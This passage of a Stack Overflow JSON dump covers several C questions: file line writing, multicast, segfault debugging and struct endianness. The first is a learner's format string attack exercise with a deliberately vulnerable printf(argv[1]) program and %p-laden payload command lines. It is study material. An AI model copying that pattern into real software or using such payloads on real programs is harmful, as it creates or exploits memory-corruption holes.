"https://i.stack.imgur.com/bs2Md.jpg?s=128&g=1", "display_name": "Marco", "link": "https://stackoverflow.com/users/3721542/marco"}, "edited": false, "score": 0, "creation_date": 1545826988, "post_id": 53931858, "comment_id": 94704453, "body": "What do you mean &quot;when I print words from the stack&quot;? What&#39;s the output of <code>.&#47;code something</code>?"}, {"owner": {"reputation": 143, "user_id": 8051390, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/339ede5ba6ab5c0f93b3752e9843674f?s=128&d=identicon&r=PG&f=1", "display_name": "xscorp7", "link": "https://stackoverflow.com/users/8051390/xscorp7"}, "reply_to_user": {"reputation": 424, "user_id": 3721542, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bs2Md.jpg?s=128&g=1", "display_name": "Marco", "link": "https://stackoverflow.com/users/3721542/marco"}, "edited": false, "score": 0, "creation_date": 1545852856, "post_id": 53931858, "comment_id": 94712773, "body": "I have edited the post! Kindly have a look @Marco"}], "migrated_from": {"other_site": {"aliases": ["http://itsecurity.stackexchange.com"], "launch_date": 1310490000, "open_beta_date": 1290106800, "closed_beta_date": 1289502000, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/security/Img/apple-touch-icon@2.png", "twitter_account": "StackSecurity", "favicon_url": "https://cdn.sstatic.net/Sites/security/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/security/Img/apple-touch-icon.png", "audience": "information security professionals", "site_url": "https://security.stackexchange.com", "api_site_parameter": "security", "logo_url": "https://cdn.sstatic.net/Sites/security/Img/logo.png", "name": "Information Security", "site_type": "main_site"}, "on_date": 1545825820, "question_id": 200379}, "owner": {"reputation": 143, "user_id": 8051390, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/339ede5ba6ab5c0f93b3752e9843674f?s=128&d=identicon&r=PG&f=1", "display_name": "xscorp7", "link": "https://stackoverflow.com/users/8051390/xscorp7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1545852798, "creation_date": 1545809802, "last_edit_date": 1545852798, "question_id": 53931858, "link": "https://stackoverflow.com/questions/53931858/how-to-write-to-an-address-if-the-address-is-present-with-other-hex-digits-in-th", "title": "How to write to an address if the address is present with other hex digits in the word", "body": "<p>I wrote this code to see If I can modify the 'target' variable through format string attack in x64.    </p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint target;\nint main(int argc , char **argv)\n{  \n    printf(argv[1]);\n    printf(\"\\n\\nTarget variable is at: %p\" , &amp;target);\n    if(target)\n        printf(\"Target Modified!\");\n    return 0;\n}   \n</code></pre>\n\n<p>Since each word in x64 has a size of 8 bytes, the address of target variable must be written in the form of 8 bytes. </p>\n\n<p>But here, the problem is that the address of target variable is </p>\n\n<p>0x555555755034   (of the form 0xAABBCCDDEEFF)</p>\n\n<p>but since word size is 8 bytes, I have to write this address something like </p>\n\n<p>0x0000555555755034    (of the form 0x0000AABBCCDDEEFF).</p>\n\n<p>but when I ran the following command to see where the target variable is located in the stack, I saw that it is always present with some other hex digits like 5ecdAABBCCDDEEFF.</p>\n\n<pre><code>./code $(python -c 'print \"\\x34\\x50\\x75\\x55\\x55\\x55\"+\"-%p\"*131')\n</code></pre>\n\n<p>In order to shape it to correct address, I tried appending two \"\\00\" before the target address like</p>\n\n<pre><code>./code $(python -c 'print \"\\x34\\x50\\x75\\x55\\x55\\x55\\x00\\x00\"+\"-%p\"*131')\n</code></pre>\n\n<p>but the terminal complained that '\\x00' will be ignored since it terminates the string.</p>\n\n<p>So my question is:\nHow can I write to an address which looks like 0xAABBCCDDEEFF but is present in word with other hex digits like 0xed4cAABBCCDDEEFF. </p>\n\n<p>I will be glad if someone can help. Please do comment If I am not clear to you!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 650, "user_id": 1094998, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f5554829129d22c9c6a2ec85f88f0cf?s=128&d=identicon&r=PG", "display_name": "shr", "link": "https://stackoverflow.com/users/1094998/shr"}, "edited": false, "score": 1, "creation_date": 1545809299, "post_id": 53928652, "comment_id": 94698625, "body": "What have you tried so far ?"}, {"owner": {"reputation": 116, "user_id": 10834059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fbeec85cc49d55ba2f761708208103d?s=128&d=identicon&r=PG", "display_name": "nincompoop_", "link": "https://stackoverflow.com/users/10834059/nincompoop"}, "reply_to_user": {"reputation": 650, "user_id": 1094998, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f5554829129d22c9c6a2ec85f88f0cf?s=128&d=identicon&r=PG", "display_name": "shr", "link": "https://stackoverflow.com/users/1094998/shr"}, "edited": false, "score": 0, "creation_date": 1545810539, "post_id": 53928652, "comment_id": 94698971, "body": "i added the code."}], "answers": [{"comments": [{"owner": {"reputation": 116, "user_id": 10834059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fbeec85cc49d55ba2f761708208103d?s=128&d=identicon&r=PG", "display_name": "nincompoop_", "link": "https://stackoverflow.com/users/10834059/nincompoop"}, "edited": false, "score": 0, "creation_date": 1545810268, "post_id": 53928873, "comment_id": 94698893, "body": "But if i write n-1 blank lines first i might have to again go back and and rewrite those lines. Will that work."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1545887165, "post_id": 53928873, "comment_id": 94719397, "body": "<a href=\"https://stackoverflow.com/questions/4652436/c-file-streams-appending-at-the-beginning\" title=\"c file streams appending at the beginning\">stackoverflow.com/questions/4652436/&hellip;</a> you need to rewrite all the lines that come after the line you want to insert if you want to insert a  line in the middle."}], "tags": [], "owner": {"reputation": 1786, "user_id": 422005, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/12c2e55edb5c5fa6905829dab6dca8fb?s=128&d=identicon&r=PG", "display_name": "user422005", "link": "https://stackoverflow.com/users/422005/user422005"}, "is_accepted": false, "score": 0, "last_activity_date": 1545809504, "creation_date": 1545809504, "answer_id": 53928873, "question_id": 53928652, "link": "https://stackoverflow.com/questions/53928652/want-to-write-some-data-to-specific-line-no-of-abc-txt-file-how-to-move-to-a-pa/53928873#53928873", "title": "Want to write some data to specific line no of abc.txt file. How to move to a particular Line no using fseek or fwrite?", "body": "<p>You write that the file is <em>new</em> - then it it will be simple to write <code>n-1</code> blank lines first (error checking omitted ...):</p>\n\n<pre><code>void write_line(const char * fname, const char * line, size_t blank_lines) {\n    FILE stream = fopen(fname, \"w\");\n\n    for (size_t i=0; i &lt; blank_lines; i++) \n        fputs(\"\\n\", stream);\n\n    fprintf(stream, \"%s\\n\", line);          \n    fclose(stream);\n}\n</code></pre>\n\n<p>But - this seems like a somewhat weird function?</p>\n"}, {"comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1545839711, "post_id": 53932112, "comment_id": 94708592, "body": "<i>fseek allows you to go to a location within an existing file. It is useful when the file has fixed size records or you know in advance the location of byte you want to go to.</i>  Not in general. <code>fseek()</code> is only useful to <i>return</i> to a location in a text stream. Per <a href=\"https://port70.net/~nsz/c/c11/n1570.html#7.21.9.2p4\" rel=\"nofollow noreferrer\"><b>7.21.9.2 The fseek function</b>, paragraph 4 of the C standard</a>: &quot;For a text stream, either offset shall be zero, or <b>offset shall be a value returned by an earlier successful call to the ftell function</b> on a stream associated with the same file and whence shall be SEEK_SET.&quot;"}], "tags": [], "owner": {"reputation": 650, "user_id": 1094998, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f5554829129d22c9c6a2ec85f88f0cf?s=128&d=identicon&r=PG", "display_name": "shr", "link": "https://stackoverflow.com/users/1094998/shr"}, "is_accepted": false, "score": 0, "last_activity_date": 1545886699, "last_edit_date": 1545886699, "creation_date": 1545827203, "answer_id": 53932112, "question_id": 53928652, "link": "https://stackoverflow.com/questions/53928652/want-to-write-some-data-to-specific-line-no-of-abc-txt-file-how-to-move-to-a-pa/53932112#53932112", "title": "Want to write some data to specific line no of abc.txt file. How to move to a particular Line no using fseek or fwrite?", "body": "<p>As explained by Andrew below, fseek sets the position indicator associated with the stream to a new position. \nCheck the reference.\n<a href=\"http://www.cplusplus.com/reference/cstdio/fseek/\" rel=\"nofollow noreferrer\">http://www.cplusplus.com/reference/cstdio/fseek/</a></p>\n\n<p>Reproducing the example in the above reference </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main ()\n{\n  FILE * pFile;\n  pFile = fopen ( \"example.txt\" , \"wb\" );\n  fputs ( \"This is an apple.\" , pFile );\n  fseek ( pFile , 9 , SEEK_SET );\n  fputs ( \" sam\" , pFile );\n  fclose ( pFile );\n  return 0;\n}\n// After this code is successfully executed, the file example.txt contains: \n// This is a sample.\n</code></pre>\n\n<p>For the problem you mentioned, simply writing into the file from beginning to end will suffice. </p>\n\n<p>Get hold of a good book on C programming. \nFor now,</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;stdlib.h&gt;\n\nint main()\n{\n    int i;\n\n    FILE *fconfig = fopen(\"config_new.txt\",\"w\");\n    if(fconfig == NULL)\n    {\n        perror(\"Error!\\n\"); // print error message\n        exit(1);\n    }\n\n    for (i = 0; i &lt; 5; i++) // line numbers from 0 ? \n    {\n            if(i % 2 == 0)\n            {\n                fprintf(fconfig, \"%d\\n\", i+17 );\n            }\n            else \n            {\n                fprintf(fconfig, \"\\n\" ); // blank lines on odd numbered lines\n            }\n\n    }\n    fclose( fconfig ); // close the file after you finish writing.\n    exit(0);\n}\n</code></pre>\n"}], "owner": {"reputation": 116, "user_id": 10834059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fbeec85cc49d55ba2f761708208103d?s=128&d=identicon&r=PG", "display_name": "nincompoop_", "link": "https://stackoverflow.com/users/10834059/nincompoop"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1545886699, "creation_date": 1545808247, "last_edit_date": 1545810476, "question_id": 53928652, "link": "https://stackoverflow.com/questions/53928652/want-to-write-some-data-to-specific-line-no-of-abc-txt-file-how-to-move-to-a-pa", "title": "Want to write some data to specific line no of abc.txt file. How to move to a particular Line no using fseek or fwrite?", "body": "<p>I want to go to to specific line no of a new text file and write some data on that line number.\nLike for example\nmy data is \n23\n51\n62</p>\n\n<p>i want line 3 to have 23\n       line 1 to have 51\n       line 2 to have 62 and so on\nHow do i jump to different line number for every data</p>\n\n<pre><code>    void main()\n\n        {\n            int i=0;\n            FILE *fconfig;\n            fconfig = fopen(\"config_new.txt\",\"w\");\n\n        for ( i = 0; i &lt; 5; i++)\n        {\n            /* code */\n            if(fconfig == NULL)\n            {\n                printf(\"error!\\n\");\n                exit(1);\n            }\n\n            // scanf(\"%d\",&amp;num);\n            if(i%2 == 0)\n            {\n            fseek(fconfig,0+i,0);\n            fprintf(fconfig, \"%d\\n\", i+17 );\n            }\n        }\n            // fclose(fconfig);\n\n        }\n</code></pre>\n\n<p>i want txt file to have data on even line numbers and \\n on others.</p>\n\n<p>This doesen't seem to work. What am i missing here.</p>\n"}, {"tags": ["c", "sockets"], "comments": [{"owner": {"reputation": 751, "user_id": 5552166, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8941926688c6212b73aa67cbb2c70428?s=128&d=identicon&r=PG&f=1", "display_name": "hessam hedieh", "link": "https://stackoverflow.com/users/5552166/hessam-hedieh"}, "edited": false, "score": 0, "creation_date": 1545820410, "post_id": 53928292, "comment_id": 94702195, "body": "Are you running this code once or in a loop?"}], "owner": {"reputation": 11, "user_id": 8211240, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac6df2ff9f766f619f3e13017ac77ccc?s=128&d=identicon&r=PG&f=1", "display_name": "Julio", "link": "https://stackoverflow.com/users/8211240/julio"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 29, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1545806131, "creation_date": 1545806131, "question_id": 53928292, "link": "https://stackoverflow.com/questions/53928292/why-multicast-can-not-receive-message-after-running-a-while-how-to-deal-with-it", "title": "why multicast can not receive message after running a while? How to deal with it?", "body": "<p>when join multicast, it runs well. But, about 1 hours later, the client can not receive the message sended by the server.Why?</p>\n\n<p>this is running on centos 7.5</p>\n\n<pre><code>port_new-&gt;bind_addr.sin_family              =   AF_INET;\nport_new-&gt;bind_addr.sin_port                =   cmcc_htons(port);\nport_new-&gt;bind_addr.sin_addr.s_addr         =   inet_addr(maddr);\n\nport_new-&gt;mreq.imr_interface.s_addr         =   cmcc_htonl(INADDR_ANY);\nport_new-&gt;mreq.imr_multiaddr.s_addr         =   inet_addr(maddr);\n\nport_new-&gt;sock_fd = socket(AF_INET, SOCK_DGRAM, 0);    \nif (port_new-&gt;sock_fd &lt; 0)\n{\n    goto socket_error;\n}\n\nret = setsockopt(port_new-&gt;sock_fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &amp;port_new-&gt;mreq, sizeof(port_new-&gt;mreq));\nif(ret &lt; 0)\n{\n    printf(\"setsockopt() IP_ADD_MEMBERSHIP error: %s(errno: %d)\\n\", strerror(errno), errno);\n    goto setsockopt_error;\n}\n\n\nret = setsockopt(port_new-&gt;sock_fd, IPPROTO_IP, IP_MULTICAST_TTL, &amp;ttl, ttl);\nif(ret &lt; 0)\n{\n    printf(\"setsockopt() IP_MULTICAST_TTL error: %s(errno: %d)\\n\", strerror(errno), errno);\n    goto setsockopt_error;\n}\n\nret = setsockopt(port_new-&gt;sock_fd, IPPROTO_IP, IP_MULTICAST_LOOP, &amp;loop, sizeof(loop));\nif(ret &lt; 0)\n{\n    printf(\"setsockopt() IP_MULTICAST_LOOP error: %s(errno: %d)\\n\", strerror(errno), errno);\n    goto setsockopt_error;\n}\n\nret = bind(port_new-&gt;sock_fd, (struct sockaddr *)&amp;port_new-&gt;bind_addr,  sizeof(port_new-&gt;bind_addr));\nif(ret &lt; 0)\n{\n    printf(\"bind() error: %s(errno: %d)\\n\", strerror(errno), errno);\n    goto bind_error;\n}\n\nreturn port_new;\n</code></pre>\n\n<p>bind_error:\nsetsockopt_error:\n    close(port_new->sock_fd);\nsocket_error:\n    cmcc_free(port_new);\n    return NULL;</p>\n"}, {"tags": ["c", "linux", "segmentation-fault"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 4, "creation_date": 1545806342, "post_id": 53928209, "comment_id": 94697801, "body": "Yes, learn how to debug your program. See <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">how to debug small programs</a>. <a href=\"https://en.wikipedia.org/wiki/Segmentation_fault\" rel=\"nofollow noreferrer\">Segmentation fault</a> is an instance of <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>. You could consider <a href=\"https://sourceware.org/gdb/onlinedocs/gdb/Remote-Debugging.html\" rel=\"nofollow noreferrer\">remote debugging with GDB</a>"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1545808885, "post_id": 53928209, "comment_id": 94698489, "body": "Also, understand that a SegFault is generally the result of assigning an invalid address to (or failing to initialize) a pointer and then attempting to access the value at that invalid address. When &quot;talking to the Rubber Duck&quot; at the link provided above, double-check any use of pointers, the addresses they are assigned or their uninitialized use. Enable full warnings for your compiler, e.g. <code>gcc -Wall -Wextra -pedantic ...</code> (at minimum) and don&#39;t accept code until it compiles without warning.."}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1545826098, "post_id": 53928209, "comment_id": 94704132, "body": "<a href=\"https://www.google.com/search?q=how+to+use+gdb+for+memory+errors\" rel=\"nofollow noreferrer\">How to use gdb for memory errors</a>, <a href=\"https://www.google.com/search?q=how+to+use+valgrind+for+memory+errors\" rel=\"nofollow noreferrer\">How to use valgrind for memory errors</a>, etc."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 7646033, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-4fU-8K36mh4/AAAAAAAAAAI/AAAAAAAAADA/VS_AlG3VYz8/photo.jpg?sz=128", "display_name": "fkaraken", "link": "https://stackoverflow.com/users/7646033/fkaraken"}, "is_accepted": false, "score": 0, "last_activity_date": 1545808560, "creation_date": 1545808560, "answer_id": 53928701, "question_id": 53928209, "link": "https://stackoverflow.com/questions/53928209/is-there-any-methods-to-solve-segment-fault/53928701#53928701", "title": "Is there any methods to solve segment fault?", "body": "<p>You can use a tool like Valgrind. It helped us a lot when we were trying to find data that is written out of bounds of an array. It is good for checking memory leaks, out-of-boundary cases and segmentation faults. Actually we just used it to check all of our C/C++ programs later and found a lot of undetected bugs.</p>\n\n<p>Note: Don't forget to compile your program with debug information (e.g. '-g' switch of gcc compiler) to get  more human readable messages in Valgrind. Check <a href=\"http://valgrind.org/docs/manual/quick-start.html\" rel=\"nofollow noreferrer\">this quick start guide</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 87, "user_id": 8547005, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed68d613e6879b0531e8a352011261d0?s=128&d=identicon&r=PG&f=1", "display_name": "Kathy.Pu", "link": "https://stackoverflow.com/users/8547005/kathy-pu"}, "edited": false, "score": 0, "creation_date": 1546823268, "post_id": 53929661, "comment_id": 94968020, "body": "I use -fsanitize and found the problem. The first method that to pipe the coredump dosen&#39;t work on my device. Thank you very much."}], "tags": [], "owner": {"reputation": 633, "user_id": 10819212, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/J8mjR.png?s=128&g=1", "display_name": "Felix G", "link": "https://stackoverflow.com/users/10819212/felix-g"}, "is_accepted": false, "score": 0, "last_activity_date": 1545814415, "creation_date": 1545814415, "answer_id": 53929661, "question_id": 53928209, "link": "https://stackoverflow.com/questions/53928209/is-there-any-methods-to-solve-segment-fault/53929661#53929661", "title": "Is there any methods to solve segment fault?", "body": "<p>Coredumps can be large, but in my experience they contain huge chunks of zeros, so they can be easily compressed. Using the /proc/sys/kernel/core_pattern file, you can get the kernel to pipe the dump through gzip, so that it takes less space ( <a href=\"https://stackoverflow.com/questions/5063295/compressing-the-core-file-during-core-generation\">compressing the core file during core generation</a> ).</p>\n\n<p>Another option would be to try the -fsanitize family of gcc options. More specifically -fsanitize=address and -fsanitize=undefined. If you do that, your application will print a lot of useful information when it crashes (often including the actual file and line number where the crash occured). Oh and don't forget to copy the corresponding shared libraries to your target, otherwise the dynamic linker will throw an error when you try to run the instrumented application.</p>\n"}], "owner": {"reputation": 87, "user_id": 8547005, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed68d613e6879b0531e8a352011261d0?s=128&d=identicon&r=PG&f=1", "display_name": "Kathy.Pu", "link": "https://stackoverflow.com/users/8547005/kathy-pu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 136, "favorite_count": 0, "closed_date": 1545826293, "answer_count": 2, "score": 2, "last_activity_date": 1545814415, "creation_date": 1545805522, "question_id": 53928209, "link": "https://stackoverflow.com/questions/53928209/is-there-any-methods-to-solve-segment-fault", "closed_reason": "Not suitable for this site", "title": "Is there any methods to solve segment fault?", "body": "<p>I am working on a IoT linux device. There is segment fault when running my applicantion. I need some methods to solve this problem.</p>\n\n<p><br>\nMethods that I have tried:</p>\n\n<p>1.coredump</p>\n\n<p>ulimit -c unlimited; unlimit -f unlimited; \ncore will create, but maybe the chip's memory is not enough, so the core is always truncatured. I cannot use gdb to get the backtrace.</p>\n\n<p>2.dmesg | grep segfault </p>\n\n<p>This linux system does not save crash in \"demsg\"</p>\n\n<p>3./var/log/messages</p>\n\n<p>This linux system does not save crash in \"/var/log/messages\"</p>\n\n<p><br>\nDo you have any suggestion to solve segment fault? Thank you very much.</p>\n"}, {"tags": ["c", "gcc", "optimization", "struct"], "comments": [{"owner": {"reputation": 445, "user_id": 8061828, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/06317685957055a3ca527087e4ee8c14?s=128&d=identicon&r=PG&f=1", "display_name": "BurningPapaya", "link": "https://stackoverflow.com/users/8061828/burningpapaya"}, "edited": false, "score": 0, "creation_date": 1545801287, "post_id": 53927398, "comment_id": 94696644, "body": "I don&#39;t see any problem with this. Maybe you could create a separate functions <code>little_to_big(test_L *little, test_B *big)</code> and <code>big_to_little(test_B *big, test_L *little)</code>. I often have classes that have more than 4 fields and there is no other way to assign/initialize them. As a side note if you have name of your function consisting of several words, devide them using snake or camel case."}, {"owner": {"reputation": 2478, "user_id": 1586231, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/sRho9.jpg?s=128&g=1", "display_name": "Max von Hippel", "link": "https://stackoverflow.com/users/1586231/max-von-hippel"}, "edited": false, "score": 0, "creation_date": 1545801294, "post_id": 53927398, "comment_id": 94696645, "body": "You&#39;re using bizarre characters in this question such as <code>\uff1f</code> and <code>\u3002</code> ... this is a little thing, but if you could fix it I think the problem would be a bit easier to read.  Also, maybe I&#39;m missing something obvious, but what do you mean here by &quot;repeat codes&quot;?  Thanks, and welcome to SO!"}, {"owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545805148, "post_id": 53927398, "comment_id": 94697490, "body": "\u201crepeat code\u201d means these code may be similar such as mode==1 &amp; mode==2 \uff0cwhich only different in assignment postion\u3002It does\u2018t looks elegent  but works"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1545806014, "post_id": 53927398, "comment_id": 94697717, "body": "Have you looked at <a href=\"https://en.wikipedia.org/wiki/Endianness\" rel=\"nofollow noreferrer\">Wikipedia - Endianness</a> -- that also provides a C-function for converting integer values between the big/little endian? (you can trivially adapt for <code>short</code> values and for <code>char</code> nothing is required.)"}, {"owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545810523, "post_id": 53927398, "comment_id": 94698966, "body": "Thank. But htonl doesn&#39;t work in my case. @ David C. Rankin"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 1, "creation_date": 1545823102, "post_id": 53927398, "comment_id": 94703149, "body": "There is a fundamental underlying error in this question: trying to use structures to describe binary data formats in a portable manner.  Instead, you should write pack/unpack functions to convert between binary data buffers and internal, native format data (that does not need to resemble the binary data storage at all).  Yes, I know that many people do do that. My point is that it is nonportable, and hard to maintain; and an easy source of bugs. Do you <i>want to</i> write buggy code, or code you can trust?"}, {"owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545840738, "post_id": 53927398, "comment_id": 94708923, "body": "I have roughly know what  do you mean. However, can you give me a little example to make the question clear. Thanks."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545894015, "post_id": 53927398, "comment_id": 94721211, "body": "Your approach is begging for bugs.  The <i>only</i> time you should ever care about endianness is when you need to read from or write to an external source of data (e.g. file on disk, network socket), and even then you should convert between a known endianness (mandated by the external format) and the system&#39;s endianness (which C abstracts away, so you shouldn&#39;t even care what that is)."}, {"owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545906077, "post_id": 53927398, "comment_id": 94725403, "body": "@jamesdlin Not exactly.  I want to find a more elegant way to code. I used the &quot;C compiler&quot; calls the struct  data member to interconvert. In this way , I did not care about the endianness. But it is not elegant ."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545880343, "post_id": 53929194, "comment_id": 94718318, "body": "Sorry to tell you that the memcpy function runs exactly what we want on Mac OS with Apple LLVM version 10.0.0 (clang-1000.11.45.5). But neither on ubuntu(gcc-7) nor on Mac OS(gcc-7)."}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 11, "user_id": 10833443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef253e851e34778bf0f66cb5b3ac56fb?s=128&d=identicon&r=PG&f=1", "display_name": "b.bkb", "link": "https://stackoverflow.com/users/10833443/b-bkb"}, "edited": false, "score": 0, "creation_date": 1545889422, "post_id": 53929194, "comment_id": 94719880, "body": "@b.bkb The fact that memcpy works at least in one case means that the idea is not totally wrong. Further analysis could tell what is wrong in the two other systems, but I must ask: where the data come from? And how are the data output after elaboration? What is the endianness of the various systems?"}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545891999, "post_id": 53929194, "comment_id": 94720560, "body": "Sorry, but this (and your comments to the deleted answer) does not make sense.  <code>memcpy</code> takes a <code>void*</code> and a number of bytes to copy.  It knows <i>nothing</i> about what&#39;s being pointed to, whether it&#39;s a <code>struct</code>, what members that <code>struct</code> contains, etc.  What I <i>would</i> be willing to believe is that in some situations, a compiler might <i>optimize out</i> <code>memcpy</code> of <code>struct</code> pointers by inlining member-wise assignments."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545892552, "post_id": 53929194, "comment_id": 94720730, "body": "But, of course, if that is the case, then it&#39;d be a compiler bug because optimizations shouldn&#39;t change behavior.  I would be curious to know if the <code>memcpy</code> approach &quot;works&quot; with all optimizations disabled."}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1545893315, 